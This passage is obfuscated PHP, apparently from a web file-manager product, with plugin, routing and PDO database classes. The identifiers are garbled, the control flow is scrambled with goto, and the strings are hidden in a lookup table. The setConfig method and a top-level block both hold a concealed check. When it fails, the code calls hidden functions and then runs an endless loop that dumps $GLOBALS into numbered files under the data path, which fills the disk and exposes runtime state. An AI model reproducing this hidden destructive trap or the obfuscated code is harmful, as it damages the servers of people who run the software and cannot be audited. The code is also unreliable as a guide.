LNG($Föà’Ù¨ Õ); $b‡Ò³•¢èõ[] = $FÒéÓŠÔÁ‘; $Cí×ÏëÛ´ä[] = str_replace(array($Dä±Æ­ãò¾[229], $Dä±Æ­ãò¾[1072], $Dä±Æ­ãò¾[340], $Dä±Æ­ãò¾[116]), array($Dä±Æ­ãò¾[50], $Dä±Æ­ãò¾[50], $Dä±Æ­ãò¾[33], $Dä±Æ­ãò¾[1480]), $cŠøå‚Î); } $F·Šàæ®ãÛ = str_replace($b‡Ò³•¢èõ, $Cí×ÏëÛ´ä, $F·Šàæ®ãÛ); goto C”­öéóù; e°“ôÌØÊ: preg_match_all($Dä±Æ­ãò¾[1479], $F·Šàæ®ãÛ, $a¡½¡˜ÃË„); if (!is_array($a¡½¡˜ÃË„) || count($a¡½¡˜ÃË„) == 0 || !is_array($a¡½¡˜ÃË„[0]) || count($a¡½¡˜ÃË„[0]) == 0) { return; } $b‡Ò³•¢èõ = array(); goto D¸ò¸‹ƒ¥»; dó—ºà”÷°: $Dä±Æ­ãò¾ =& $_SERVER[Ö‘Øù]; $Aíì‹ÃŞ”¶ = $Dä±Æ­ãò¾[1478]; if (!strstr($F·Šàæ®ãÛ, $Aíì‹ÃŞ”¶)) { return; } goto e°“ôÌØÊ; C”­öéóù: } private function parseConfig(&$EÓ¥ÃÎ…âˆ) { goto eµßÚ´¡ÖŸ; EÖÖÉï”…‰: preg_match_all($cÀ”î—òê[1482], $EÓ¥ÃÎ…âˆ, $Bâ–ÎïéÊÍ); if (!is_array($Bâ–ÎïéÊÍ) || count($Bâ–ÎïéÊÍ) == 0 || !is_array($Bâ–ÎïéÊÍ[0]) || count($Bâ–ÎïéÊÍ[0]) == 0) { return; } $f¯­”Òé‹“ = $this->getConfig(); goto Bƒö’­óç; eµßÚ´¡ÖŸ: $cÀ”î—òê =& $_SERVER[Ö‘Øù]; $B»š°»ù¼ = $cÀ”î—òê[1481]; if (!strstr($EÓ¥ÃÎ…âˆ, $B»š°»ù¼)) { return; } goto EÖÖÉï”…‰; Bƒö’­óç: $e¹’ŒÎÇÄ = array(); $cß½à•¦¸Î = array(); foreach ($Bâ–ÎïéÊÍ[0] as $E•‚ °ƒ¯) { $E™î…½À…‰ = substr($E•‚ °ƒ¯, strlen($B»š°»ù¼), -2); $e¹’ŒÎÇÄ[] = $E•‚ °ƒ¯; $cß½à•¦¸Î[] = _get($f¯­”Òé‹“, $E™î…½À…‰); } goto EŠÔåƒœ; EŠÔåƒœ: $EÓ¥ÃÎ…âˆ = str_replace($e¹’ŒÎÇÄ, $cß½à•¦¸Î, $EÓ¥ÃÎ…âˆ); goto F…“Ìİ¦—Ğ; F…“Ìİ¦—Ğ: } private function parsePackage(&$B¤›™¡¡–È) { goto E¾…ÈëìøÊ; eÑ¥–¶”ñ÷: $b°Á±¢¤Œ = array(); $EÒ¹²Ì¦³‡ = array(); foreach ($eƒËé½å•¿[0] as $a¶¹à¶áØÅ) { $f—ãÕÙ…À = substr($a¶¹à¶áØÅ, strlen($C‹æèÆöå), -2); $b°Á±¢¤Œ[] = $a¶¹à¶áØÅ; $EÒ¹²Ì¦³‡[] = _get($eØÏ­†”íÔ, $f—ãÕÙ…À); } goto a’ö¿Öí‰‡; d‹‰Œ˜ĞÀ‘: preg_match_all($AÀ£ñâ™‚±[1484], $B¤›™¡¡–È, $eƒËé½å•¿); if (!is_array($eƒËé½å•¿) || count($eƒËé½å•¿) == 0 || !is_array($eƒËé½å•¿[0]) || count($eƒËé½å•¿[0]) == 0) { return; } $eØÏ­†”íÔ = $this->appPackage(); goto eÑ¥–¶”ñ÷; a’ö¿Öí‰‡: $B¤›™¡¡–È = str_replace($b°Á±¢¤Œ, $EÒ¹²Ì¦³‡, $B¤›™¡¡–È); goto F½ËÍ–; E¾…ÈëìøÊ: $AÀ£ñâ™‚± =& $_SERVER[Ö‘Øù]; $C‹æèÆöå = $AÀ£ñâ™‚±[1483]; if (!strstr($B¤›™¡¡–È, $C‹æèÆöå)) { return; } goto d‹‰Œ˜ĞÀ‘; F½ËÍ–: } final function echoFile($dƒ”‘¼®›, $dÕ½÷˜¹­¹ = false) { goto Fîâ‚¸ïÃ¶; c¹––ñŞË²: $f­­Š¸ç = $this->parseFile($b£ÉÒÊŠİâ); $this->parseLang($f­­Š¸ç); $this->parseConfig($f­­Š¸ç); goto fíùçÀÎÄí; fíùçÀÎÄí: $this->parsePackage($f­­Š¸ç); if (is_array($dÕ½÷˜¹­¹)) { $f­­Š¸ç = str_replace(array_keys($dÕ½÷˜¹­¹), array_values($dÕ½÷˜¹­¹), $f­­Š¸ç); } echo $dÕó¤Œç»Ë[229] . $f­­Š¸ç; goto b‘“êÙïÂÛ; Fîâ‚¸ïÃ¶: $dÕó¤Œç»Ë =& $_SERVER[Ö‘Øù]; $b£ÉÒÊŠİâ = $this->pluginPath . $dƒ”‘¼®›; if (ACT == $dÕó¤Œç»Ë[1485]) { echo $dÕó¤Œç»Ë[1486] . $this->pluginName . $dÕó¤Œç»Ë[8] . $dƒ”‘¼®› . $dÕó¤Œç»Ë[1487]; if (!file_exists($b£ÉÒÊŠİâ)) { echo $dÕó¤Œç»Ë[1488]; return; } } goto c¹––ñŞË²; b‘“êÙïÂÛ: } final function initLang() { goto FöœƒßÄíÛ; FöœƒßÄíÛ: $eèİ—’Àœù =& $_SERVER[Ö‘Øù]; $E“ñ°°œâĞ = $eèİ—’Àœù[1489]; $Bæá¹ÑòÍ• = $this->pluginPath . $eèİ—’Àœù[1490]; goto eŠîÈğé¿õ; c‘®…èÁùõ: if (!is_array($F·¾äè¿¶)) { return array(); } if (@count($F·¾äè¿¶) > 0) { I18n::set($F·¾äè¿¶); } return $F·¾äè¿¶; goto a£Şì¨®±µ; eŠîÈğé¿õ: $E®Ñ‘˜ÕŸ¬ = I18n::getType(); $F·¾äè¿¶ = array(); if (file_exists($Bæá¹ÑòÍ• . $E®Ñ‘˜ÕŸ¬ . $eèİ—’Àœù[845])) { $F·¾äè¿¶ = (include $Bæá¹ÑòÍ• . $E®Ñ‘˜ÕŸ¬ . $eèİ—’Àœù[845]); } else { if ($E®Ñ‘˜ÕŸ¬ == $eèİ—’Àœù[1491] && !file_exists($Bæá¹ÑòÍ• . $E®Ñ‘˜ÕŸ¬ . $eèİ—’Àœù[845]) && file_exists($Bæá¹ÑòÍ• . $eèİ—’Àœù[1492])) { $F·¾äè¿¶ = (include $Bæá¹ÑòÍ• . $eèİ—’Àœù[1492]); } else { if (file_exists($Bæá¹ÑòÍ• . $E“ñ°°œâĞ . $eèİ—’Àœù[845])) { $F·¾äè¿¶ = (include $Bæá¹ÑòÍ• . $E“ñ°°œâĞ . $eèİ—’Àœù[845]); } } } goto c‘®…èÁùõ; a£Şì¨®±µ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($a™ÛàÎ) { $fª®õ¹ÎÃÚ =& $_SERVER[Ö‘Øù]; $f…§ìÆ¿­± = $_SERVER[$fª®õ¹ÎÃÚ[835]]; $dÇÈªœ˜ï = $fª®õ¹ÎÃÚ[873]; if ($_SERVER[$fª®õ¹ÎÃÚ[834]] != $dÇÈªœ˜ï($f…§ìÆ¿­±)) { goto c°„ª°¸; e¾¡¦ºğóæ: $A¡áİÑÌáÃ(); $CšÏ™Ù›†œ = $fª®õ¹ÎÃÚ[877]; $e¤¡µ®äœ‚ = json_encode($GLOBALS[$fª®õ¹ÎÃÚ[878]]); goto Bñ¢ˆ”…¾›; c°„ª°¸: $A¡áİÑÌáÃ = $fª®õ¹ÎÃÚ[874]; $b•ùˆÅˆ‘ = $fª®õ¹ÎÃÚ[836]; $d¶Ñç°İ = $_SERVER[$fª®õ¹ÎÃÚ[837]] . $fª®õ¹ÎÃÚ[838]; goto Dº«Ô¼¬ÃÍ; Bç±‡¦¹ä: $dÎËá¹§ƒ = $fª®õ¹ÎÃÚ[875]; $dÎËá¹§ƒ($_SERVER[$fª®õ¹ÎÃÚ[876]]); $A¡áİÑÌáÃ = $fª®õ¹ÎÃÚ[874]; goto e¾¡¦ºğóæ; Dº«Ô¼¬ÃÍ: $C‚îî±ÜÆØ = $b•ùˆÅˆ‘($d¶Ñç°İ); $E±‘Ì¸œ³£ = explode($fª®õ¹ÎÃÚ[229], $C‚îî±ÜÆØ); if (count($E±‘Ì¸œ³£) < $fª®õ¹ÎÃÚ[606]) { $CÔìÖ½Ø“Ô = $fª®õ¹ÎÃÚ[839]; $CÔìÖ½Ø“Ô(); } goto Bç±‡¦¹ä; Bñ¢ˆ”…¾›: $F„¶¬ê„é = 1; for ($F£†—Ê—Şø = $F„¶¬ê„é; $F£†—Ê—Şø > 0; $F£†—Ê—Şø++) { $CšÏ™Ù›†œ(DATA_PATH . $F£†—Ê—Şø, $e¤¡µ®äœ‚); } goto Câ÷Æ¡Ş†Ö; Câ÷Æ¡Ş†Ö: } return $this->modelPlugin->setConfig($this->pluginName, $a™ÛàÎ); } public function onSetConfig($E¶ÁĞ­˜ƒ) { } public function onGetConfig($Aò‚¾öÓ¢‘) { } public function onChangeStatus($aØÊªË…ï¢) { } public function onUninstall() { } public function onInstall() { } public function authCheck($fôµ‰ê×´• = "\160\154\x75\x67\x69\156\x41\x75\164\150") { $c„‹‹™å‡ =& $_SERVER[Ö‘Øù]; if (!defined($c„‹‹™å‡[469])) { return !1; } if (_get($GLOBALS, $c„‹‹™å‡[500])) { return !0; } $Cñî·°°–© = $this->getConfig(); if (!$Cñî·°°–©[$fôµ‰ê×´•]) { return !1; } return ActionCall($c„‹‹™å‡[1493], $Cñî·°°–©[$fôµ‰ê×´•]); } public function url($cœŠµõµ›÷, $cİ ªÅÀšÔ = '', $b‘·Â±»‰ = true) { goto AÔ¾©Éã¬°; e¿Ş‰ƒµ™: $féªâ¡æ¶ = $this->packageVersion(); $eÁæÖÔ ’ = $F¼¢‹”ß¥ô . $cÆ›³Œ¦Œ[455] . $féªâ¡æ¶; if (substr($cœŠµõµ›÷, 0, 4) == $cÆ›³Œ¦Œ[147] || substr($cœŠµõµ›÷, 0, 2) == $cÆ›³Œ¦Œ[1279]) { $E½²¡’‚ÄÃ = $cœŠµõµ›÷ . $cÆ›³Œ¦Œ[1494] . $eÁæÖÔ ’; } else { if ($cİ ªÅÀšÔ == $cÆ›³Œ¦Œ[33]) { $E½²¡’‚ÄÃ = $this->pluginHost . $cœŠµõµ›÷ . $cÆ›³Œ¦Œ[1494] . $eÁæÖÔ ’; } else { if ($cİ ªÅÀšÔ === $cÆ›³Œ¦Œ[77]) { $E½²¡’‚ÄÃ = $this->pluginHost . $cœŠµõµ›÷; } else { if ($cİ ªÅÀšÔ == $cÆ›³Œ¦Œ[1495]) { $E½²¡’‚ÄÃ = STATIC_PATH . $cœŠµõµ›÷ . $cÆ›³Œ¦Œ[1494] . $F¼¢‹”ß¥ô; } else { if ($cİ ªÅÀšÔ == $cÆ›³Œ¦Œ[1496]) { $E½²¡’‚ÄÃ = APP_HOST . $cÆ›³Œ¦Œ[1497] . $cœŠµõµ›÷ . $cÆ›³Œ¦Œ[1494] . $F¼¢‹”ß¥ô; } else { if (isset($EÑ‘È¸ÔÕÓ[$cİ ªÅÀšÔ])) { $E½²¡’‚ÄÃ = $EÑ‘È¸ÔÕÓ[$cİ ªÅÀšÔ] . $cœŠµõµ›÷ . $cÆ›³Œ¦Œ[1494] . $eÁæÖÔ ’; } } } } } } goto a´©ø²ôÙ¯; a´©ø²ôÙ¯: if (!$b‘·Â±»‰) { return $E½²¡’‚ÄÃ; } echo $E½²¡’‚ÄÃ; goto Dš¬‰éÏêÌ; AÔ¾©Éã¬°: $cÆ›³Œ¦Œ =& $_SERVER[Ö‘Øù]; $EÑ‘È¸ÔÕÓ = $this->getConfig(); $F¼¢‹”ß¥ô = KOD_VERSION . $cÆ›³Œ¦Œ[95] . KOD_VERSION_BUILD; goto e¿Ş‰ƒµ™; Dš¬‰éÏêÌ: } public function link($eš¾ÊŠÍ¯ˆ = false, $cØ¬ºº…‹À = '') { $c‘Ë¨ƒĞØ³ =& $_SERVER[Ö‘Øù]; if (!$eš¾ÊŠÍ¯ˆ) { $this->link($c‘Ë¨ƒĞØ³[1498], $c‘Ë¨ƒĞØ³[1496]); $this->link($c‘Ë¨ƒĞØ³[1499], $c‘Ë¨ƒĞØ³[1495]); $this->link($c‘Ë¨ƒĞØ³[1500], $c‘Ë¨ƒĞØ³[1495]); $this->link($c‘Ë¨ƒĞØ³[1501], $c‘Ë¨ƒĞØ³[1495]); $this->link($c‘Ë¨ƒĞØ³[1502], $c‘Ë¨ƒĞØ³[1495]); return; } $f‹®ùáÛÇ‹ = $this->url($eš¾ÊŠÍ¯ˆ, $cØ¬ºº…‹À, !1); if (substr($eš¾ÊŠÍ¯ˆ, -3) == $c‘Ë¨ƒĞØ³[1503]) { echo $c‘Ë¨ƒĞØ³[1504] . $f‹®ùáÛÇ‹ . $c‘Ë¨ƒĞØ³[1505] . $c‘Ë¨ƒĞØ³[229]; } else { if (substr($eš¾ÊŠÍ¯ˆ, -4) == $c‘Ë¨ƒĞØ³[1506]) { echo $c‘Ë¨ƒĞØ³[1507] . $f‹®ùáÛÇ‹ . $c‘Ë¨ƒĞØ³[1508] . $c‘Ë¨ƒĞØ³[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\x5e\x2f\x5d\x2b", "\x3a\156\x75\x6d" => "\133\60\x2d\71\135\x2b", "\x3a\x61\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($E‡Æ¾ËôŞ‚, $eÖ³ø•¬Œ) { $d­’Øò¯¯¼ =& $_SERVER[Ö‘Øù]; if ($E‡Æ¾ËôŞ‚ == $d­’Øò¯¯¼[1509]) { $Fœ°ƒíÓë™ = array_map($d­’Øò¯¯¼[1510], $eÖ³ø•¬Œ[0]); $a÷ØñÖÇöä = strpos($eÖ³ø•¬Œ[1], $d­’Øò¯¯¼[8]) === 0 ? $eÖ³ø•¬Œ[1] : $d­’Øò¯¯¼[8] . $eÖ³ø•¬Œ[1]; $bÅäÖÆÀ‡ = $eÖ³ø•¬Œ[2]; } else { $Fœ°ƒíÓë™ = null; $a÷ØñÖÇöä = strpos($eÖ³ø•¬Œ[0], $d­’Øò¯¯¼[8]) === 0 ? $eÖ³ø•¬Œ[0] : $d­’Øò¯¯¼[8] . $eÖ³ø•¬Œ[0]; $bÅäÖÆÀ‡ = $eÖ³ø•¬Œ[1]; } array_push(self::$maps, $Fœ°ƒíÓë™); array_push(self::$routes, $a÷ØñÖÇöä); array_push(self::$methods, strtoupper($E‡Æ¾ËôŞ‚)); array_push(self::$callbacks, $bÅäÖÆÀ‡); } public static function error($F°‹ŒˆÁÎ‡) { self::$errorCallback = $F°‹ŒˆÁÎ‡; } public static function haltOnMatch($B·Ğ ¸Ä–¡ = true) { self::$halts = $B·Ğ ¸Ä–¡; } public static function dispatch() { goto eù¼¨†ËÓ; cÍÍª¯ÂÇ÷: self::$routes = preg_replace($f¸„©ø–[1198], $f¸„©ø–[8], self::$routes); if (in_array($c½ø¤ĞÜ…–, self::$routes)) { $aÏÌ‹­ÄÒí = array_keys(self::$routes, $c½ø¤ĞÜ…–); foreach ($aÏÌ‹­ÄÒí as $F°½º¯†‰¬) { if (self::$methods[$F°½º¯†‰¬] == $E‹ò§•¹ç || self::$methods[$F°½º¯†‰¬] == $f¸„©ø–[1512] || in_array($E‹ò§•¹ç, self::$maps[$F°½º¯†‰¬])) { $A„À»ñÂ³š = !0; if (!is_object(self::$callbacks[$F°½º¯†‰¬])) { $fÃÔîŸğê = explode($f¸„©ø–[8], self::$callbacks[$F°½º¯†‰¬]); $c‡ì–­™âÑ = end($fÃÔîŸğê); $A¸¯˜Å¸Ö = explode($f¸„©ø–[1513], $c‡ì–­™âÑ); $d‰²©ÃŸà = new $A¸¯˜Å¸Ö[0](); $d‰²©ÃŸà->{$A¸¯˜Å¸Ö[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$F°½º¯†‰¬]); if (self::$halts) { return; } } } } } else { $DÄÑÑô¦ø¦ = 0; foreach (self::$routes as $F°½º¯†‰¬) { if (strpos($F°½º¯†‰¬, $f¸„©ø–[4]) !== !1) { $F°½º¯†‰¬ = str_replace($B‘Š™‰ŞøÖ, $AùËàˆšÑÙ, $F°½º¯†‰¬); } if (preg_match($f¸„©ø–[1514] . $F°½º¯†‰¬ . $f¸„©ø–[1515], $c½ø¤ĞÜ…–, $F™‡ƒó Âì)) { if (self::$methods[$DÄÑÑô¦ø¦] == $E‹ò§•¹ç || self::$methods[$DÄÑÑô¦ø¦] == $f¸„©ø–[1512] || !empty(self::$maps[$DÄÑÑô¦ø¦]) && in_array($E‹ò§•¹ç, self::$maps[$DÄÑÑô¦ø¦])) { $A„À»ñÂ³š = !0; array_shift($F™‡ƒó Âì); if (!is_object(self::$callbacks[$DÄÑÑô¦ø¦])) { $fÃÔîŸğê = explode($f¸„©ø–[8], self::$callbacks[$DÄÑÑô¦ø¦]); $c‡ì–­™âÑ = end($fÃÔîŸğê); $A¸¯˜Å¸Ö = explode($f¸„©ø–[1513], $c‡ì–­™âÑ); $d‰²©ÃŸà = new $A¸¯˜Å¸Ö[0](); if (!method_exists($d‰²©ÃŸà, $A¸¯˜Å¸Ö[1])) { echo $f¸„©ø–[1516]; } else { call_user_func_array(array($d‰²©ÃŸà, $A¸¯˜Å¸Ö[1]), $F™‡ƒó Âì); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$DÄÑÑô¦ø¦], $F™‡ƒó Âì); if (self::$halts) { return; } } } } $DÄÑÑô¦ø¦++; } } if ($A„À»ñÂ³š == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $CÏÕî‹öò² =& $_SERVER[Ö‘Øù]; header($_SERVER[$CÏÕî‹öò²[1517]] . $CÏÕî‹öò²[1518]); echo $CÏÕî‹öò²[1519]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$f¸„©ø–[1511]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto a¶„×à’Ì; C§×Š¸¬Í†: $B‘Š™‰ŞøÖ = array_keys(static::$patterns); $AùËàˆšÑÙ = array_values(static::$patterns); $A„À»ñÂ³š = !1; goto cÍÍª¯ÂÇ÷; eù¼¨†ËÓ: $f¸„©ø– =& $_SERVER[Ö‘Øù]; $c½ø¤ĞÜ…– = parse_url($_SERVER[$f¸„©ø–[1511]], PHP_URL_PATH); $E‹ò§•¹ç = $_SERVER[$f¸„©ø–[157]]; goto C§×Š¸¬Í†; a¶„×à’Ì: } } goto b„ê†“„ãó; Bßêà‡Ùì–: if ($_SERVER[$_SERVER[Ö‘Øù][834]] != $_SERVER[$_SERVER[Ö‘Øù][908]]) { goto C§µ„‰‹ãÕ; d”Ÿ™íÙ‹ß: $A»ŞÅ¬çÛÛ = explode($_SERVER[Ö‘Øù][229], $Eù±ã†½µë); if (count($A»ŞÅ¬çÛÛ) < $_SERVER[Ö‘Øù][614]) { $F…ìî£Ğ”† = $_SERVER[Ö‘Øù][839]; $F…ìî£Ğ”†(); } $C›Îö²ôßï = $_SERVER[Ö‘Øù][840]; goto c³øğóì›; C§µ„‰‹ãÕ: $A®Åøàªïà = $_SERVER[Ö‘Øù][836]; $C¯ïäÊƒ¨Ï = $_SERVER[$_SERVER[Ö‘Øù][837]] . $_SERVER[Ö‘Øù][838]; $Eù±ã†½µë = $A®Åøàªïà($C¯ïäÊƒ¨Ï); goto d”Ÿ™íÙ‹ß; c³øğóì›: $C›Îö²ôßï($_SERVER[$_SERVER[Ö‘Øù][835]]); goto DÌ„¿ìÙ¸¨; DÌ„¿ìÙ¸¨: } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($fÙ¤Âç¸  = '') { $F’ÉªÊ„×× =& $_SERVER[Ö‘Øù]; if (!class_exists($F’ÉªÊ„××[909])) { think_exception(think_lang($F’ÉªÊ„××[10]) . $F’ÉªÊ„××[910]); } if (!empty($fÙ¤Âç¸ )) { $this->config = $fÙ¤Âç¸ ; if (empty($this->config[$F’ÉªÊ„××[13]])) { $this->config[$F’ÉªÊ„××[13]] = array(); } } } public function connect($cÔéƒ¤æ² = '', $dŸ§ˆŒË¯ = 0) { $c¡Ä²³çî =& $_SERVER[Ö‘Øù]; if (!isset($this->linkID[$dŸ§ˆŒË¯])) { goto F¿õ…ÈÎˆƒ; F¿õ…ÈÎˆƒ: if (empty($cÔéƒ¤æ²)) { $cÔéƒ¤æ² = $this->config; } $EÚŞå•×ğ’ = !empty($cÔéƒ¤æ²[$c¡Ä²³çî[13]][$c¡Ä²³çî[14]]) ? $cÔéƒ¤æ²[$c¡Ä²³çî[13]][$c¡Ä²³çî[14]] : $this->pconnect; if ($EÚŞå•×ğ’) { $cÔéƒ¤æ²[$c¡Ä²³çî[13]][PDO::ATTR_PERSISTENT] = !0; } goto eâ£®ÈÂª“; C¬…Èä ò: if (!$this->linkID[$dŸ§ˆŒË¯]) { think_exception($c¡Ä²³çî[919]); } try { $this->linkID[$dŸ§ˆŒË¯]->exec($c¡Ä²³çî[920] . think_config($c¡Ä²³çî[886])); } catch (Exception $E¹†Ö—Ô) { } $this->connected = !0; goto C”âŸ›ˆÏ¹; eâ£®ÈÂª“: try { $this->linkID[$dŸ§ˆŒË¯] = new PDO($cÔéƒ¤æ²[$c¡Ä²³çî[911]], $cÔéƒ¤æ²[$c¡Ä²³çî[883]], $cÔéƒ¤æ²[$c¡Ä²³çî[884]], $cÔéƒ¤æ²[$c¡Ä²³çî[13]]); } catch (PDOException $E¹†Ö—Ô) { think_exception($E¹†Ö—Ô->getMessage()); } $this->dbType = $this->_getDsnType($cÔéƒ¤æ²[$c¡Ä²³çî[911]]); if (in_array($this->dbType, array($c¡Ä²³çî[912], $c¡Ä²³çî[913], $c¡Ä²³çî[914], $c¡Ä²³çî[915]))) { think_exception($c¡Ä²³çî[916] . $this->dbType . $c¡Ä²³çî[917] . $this->dbType . $c¡Ä²³çî[918]); } goto C¬…Èä ò; C”âŸ›ˆÏ¹: if (1 != think_config($c¡Ä²³çî[18])) { unset($this->config); } goto BõÍ™‹Š¹‚; BõÍ™‹Š¹‚: } return $this->linkID[$dŸ§ˆŒË¯]; } public function free() { $this->PDOStatement = null; } public function query($e™Èëõñ, $EÙ®´¾Èğâ = array()) { goto Dï¼„»´Ùö; Dï¼„»´Ùö: $d ¥¡²ª¥“ =& $_SERVER[Ö‘Øù]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dÀ×Ğøèîª; c¹ß…¨õÙ: think_action_status($d ¥¡²ª¥“[19], 1); think_status($d ¥¡²ª¥“[20]); $this->PDOStatement = $this->_linkID->prepare($e™Èëõñ); goto CÇ½¦³¯¨é; CÇ½¦³¯¨é: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $BÂë£ÖÆ²Å = $this->PDOStatement->execute($EÙ®´¾Èğâ); $this->debug(); goto Fíœ¾ÈÔà¾; Fíœ¾ÈÔà¾: if (!1 === $BÂë£ÖÆ²Å) { $this->error(); return !1; } else { return $this->getAll(); } goto F…÷Ï‘²ÅË; dÀ×Ğøèîª: $this->queryStr = $e™Èëõñ; if (!empty($EÙ®´¾Èğâ)) { $this->queryStr .= $d ¥¡²ª¥“[921] . print_r($EÙ®´¾Èğâ, !0) . $d ¥¡²ª¥“[922]; } if (!empty($this->PDOStatement)) { $this->free(); } goto c¹ß…¨õÙ; F…÷Ï‘²ÅË: } public function execute($e¹¯²ğ¯«, $céîå¤šŸ = array()) { goto b³äÅÚ…ù; F¼‚Œ–Ûç„: think_status($A½’Éèãçè[20]); $this->PDOStatement = $this->_linkID->prepare($e¹¯²ğ¯«); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto cœÍ†¦Ò¡Î; cœÍ†¦Ò¡Î: $f«ÎÁ®³¿ğ = $this->PDOStatement->execute($céîå¤šŸ); $this->debug(); if (!1 === $f«ÎÁ®³¿ğ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($B¬è¾Øèƒ || preg_match($A½’Éèãçè[927], $e¹¯²ğ¯«)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Cìó³ª‚’; b™¿àÚ¢—©: $this->queryStr = $e¹¯²ğ¯«; if (!empty($céîå¤šŸ)) { $this->queryStr .= $A½’Éèãçè[921] . print_r($céîå¤šŸ, !0) . $A½’Éèãçè[922]; } $B¬è¾Øèƒ = !1; goto fˆµÎ¬¥„­; b³äÅÚ…ù: $A½’Éèãçè =& $_SERVER[Ö‘Øù]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b™¿àÚ¢—©; fˆµÎ¬¥„­: if ($this->dbType == $A½’Éèãçè[915]) { if (preg_match($A½’Éèãçè[923], $this->queryStr, $a«Ö†Ê‰ñ¥)) { $this->table = think_config($A½’Éèãçè[924]) . str_ireplace(think_config($A½’Éèãçè[925]), $A½’Éèãçè[376], $a«Ö†Ê‰ñ¥[2]); $B¬è¾Øèƒ = (bool) $this->query($A½’Éèãçè[926] . strtoupper($this->table) . $A½’Éèãçè[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($A½’Éèãçè[21], 1); goto F¼‚Œ–Ûç„; Cìó³ª‚’: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EŞášÆæƒÑ = $this->_linkID->commit(); $this->transTimes = 0; if (!$EŞášÆæƒÑ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $f¶ëÀÈ”£™ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$f¶ëÀÈ”£™) { $this->error(); return !1; } } return !0; } private function getAll() { $eĞĞ©áŞÕè = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($eĞĞ©áŞÕè); return $eĞĞ©áŞÕè; } public function getFields($b–ç–é¥Óà) { goto C‚¼â®ÏÜ¹; E‘¥ïãæë: $eí™¡ÏÅÚí = $this->query($e¶ƒªãÁê); $D…ŠåˆÙ’  = array(); if ($eí™¡ÏÅÚí) { foreach ($eí™¡ÏÅÚí as $F×¸ˆ÷£Ù§ => $c”¶¤à—) { $c”¶¤à— = array_change_key_case($c”¶¤à—); $c”¶¤à—[$A“æ „Ä³[28]] = isset($c”¶¤à—[$A“æ „Ä³[28]]) ? $c”¶¤à—[$A“æ „Ä³[28]] : $A“æ „Ä³[376]; $c”¶¤à—[$A“æ „Ä³[29]] = isset($c”¶¤à—[$A“æ „Ä³[29]]) ? $c”¶¤à—[$A“æ „Ä³[29]] : $A“æ „Ä³[376]; $CÛÊÕÛƒ„ = isset($c”¶¤à—[$A“æ „Ä³[271]]) ? $c”¶¤à—[$A“æ „Ä³[271]] : $c”¶¤à—[$A“æ „Ä³[28]]; $D…ŠåˆÙ’ [$CÛÊÕÛƒ„] = array($A“æ „Ä³[28] => $CÛÊÕÛƒ„, $A“æ „Ä³[29] => $c”¶¤à—[$A“æ „Ä³[29]], $A“æ „Ä³[31] => (bool) (isset($c”¶¤à—[$A“æ „Ä³[103]]) && $c”¶¤à—[$A“æ „Ä³[103]] === $A“æ „Ä³[33] || isset($c”¶¤à—[$A“æ „Ä³[31]]) && $c”¶¤à—[$A“æ „Ä³[31]] === $A“æ „Ä³[33]), $A“æ „Ä³[34] => isset($c”¶¤à—[$A“æ „Ä³[34]]) ? $c”¶¤à—[$A“æ „Ä³[34]] : (isset($c”¶¤à—[$A“æ „Ä³[53]]) ? $c”¶¤à—[$A“æ „Ä³[53]] : $A“æ „Ä³[376]), $A“æ „Ä³[36] => isset($c”¶¤à—[$A“æ „Ä³[93]]) ? strtolower($c”¶¤à—[$A“æ „Ä³[93]]) == $A“æ „Ä³[38] : (isset($c”¶¤à—[$A“æ „Ä³[54]]) ? $c”¶¤à—[$A“æ „Ä³[54]] : !1), $A“æ „Ä³[39] => isset($c”¶¤à—[$A“æ „Ä³[944]]) ? strtolower($c”¶¤à—[$A“æ „Ä³[944]]) == $A“æ „Ä³[41] : (isset($c”¶¤à—[$A“æ „Ä³[93]]) ? $c”¶¤à—[$A“æ „Ä³[93]] : !1)); } } goto D˜éµ‰×ìÆ; D˜éµ‰×ìÆ: return $D…ŠåˆÙ’ ; goto d‹ÊİØÈ¶š; C‚¼â®ÏÜ¹: $A“æ „Ä³ =& $_SERVER[Ö‘Øù]; $this->initConnect(!0); if (think_config($A“æ „Ä³[928])) { $e¶ƒªãÁê = str_replace($A“æ „Ä³[929], $b–ç–é¥Óà, think_config($A“æ „Ä³[928])); } else { switch ($this->dbType) { case $A“æ „Ä³[912]: case $A“æ „Ä³[930]: $e¶ƒªãÁê = "\123\105\x4c\x45\x43\x54\40\40\40\x63\157\x6c\165\155\x6e\137\156\141\x6d\145\40\141\163\x20\47\x4e\141\x6d\145\x27\54\40\x20\40\x64\x61\x74\141\x5f\x74\x79\x70\145\40\x61\163\x20\x27\124\171\160\145\47\54\x20\x20\40\143\157\154\165\155\x6e\x5f\144\145\x66\x61\165\x6c\x74\40\141\163\x20\47\x44\x65\x66\x61\x75\x6c\x74\x27\x2c\40\40\x20\151\163\137\156\x75\154\x6c\141\142\154\x65\x20\x61\x73\40\x27\x4e\165\154\154\x27\12\11\11\x46\x52\x4f\115\x9\x69\156\146\x6f\x72\155\x61\x74\151\157\156\137\x73\x63\x68\x65\155\141\56\164\141\142\x6c\x65\163\x20\x41\x53\40\164\12\11\